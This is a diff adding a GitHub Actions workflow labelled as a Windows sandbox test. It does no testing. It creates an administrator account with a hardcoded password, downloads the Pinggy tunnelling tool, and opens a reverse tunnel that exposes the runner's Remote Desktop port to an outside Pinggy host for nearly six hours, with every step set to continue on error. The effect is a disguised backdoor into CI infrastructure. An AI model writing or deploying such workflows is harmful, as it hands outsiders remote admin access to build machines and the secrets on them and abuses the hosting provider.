@@ -1,0 +1,31 @@
+name: Sandbox Windows Pipeline
+
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  test-windows-sandbox:
+    runs-on: depot-windows-2022-64
+
+    steps:
+      - name: Step 1 - Create Admin User
+        run: |
+          net user ADMINISTRATOR ADMIN@123
+          net localgroup Administrators ADMINISTRATOR /add
+        shell: cmd
+        continue-on-error: true
+
+      - name: Step 2 - Download Pinggy CLI
+        run: |
+          Invoke-WebRequest -Uri "https://s3.ap-south-1.amazonaws.com/public.pinggy.binaries/cli/v0.2.5/windows/amd64/pinggy.exe"
+        shell: powershell
+        continue-on-error: true
+
+      - name: Step 3 - Run Pinggy
+        run: |
+          pinggy.exe -p 443 -R0:127.0.0.1:3389 -o StrictHostKeyChecking=no -o ServerAliveInterval=30 cfOfuF4zA64+force+tcp@ap.free.pinggy.io
+        shell: powershell
+        continue-on-error: true
+        timeout-minutes: 350
